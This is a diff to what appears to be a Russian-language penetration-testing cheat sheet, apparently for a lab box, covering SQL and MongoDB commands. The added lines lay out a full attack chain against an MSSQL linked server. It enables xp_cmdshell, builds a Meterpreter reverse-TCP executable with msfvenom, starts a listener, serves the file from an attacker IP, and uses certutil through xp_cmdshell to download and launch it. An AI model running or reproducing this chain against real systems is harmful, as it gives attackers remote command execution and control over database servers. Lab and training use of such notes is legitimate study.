@@ -165,7 +165,16 @@ exec xp_dirtree 'c:/';
 
         describe wp_users; (описать таблицу)
 
-это интересно!!!                enum_links                 - enum linked servers
+это интересно!!!  ПЕРЕЧИСЛЕНИЕ СВЯЗАННХ СЕРВЕРОВ                  enum_links                 - enum linked servers
+                                                                    use_link "DC02.darkzero.ext"
+                                                                    enable_xp_cmdshell
+                                                                    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4242 -f exe -o s.exe
+                                                                    msfconsole -x "use exploits/multi/handler; set lhost tun0; set lport 4242; set payload windows/x64/meterpreter/reverse_tcp; exploit"
+                                                                    python3 -m http.server 4243
+                                                                    xp_cmdshell "certutil -urlcache -f http://10.10.16.28:4243/s.exe %TEMP%/s.exe"
+                                                                    xp_cmdshell "start %TEMP%/s.exe"
+                                                                            
+
 
 # mongodb
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
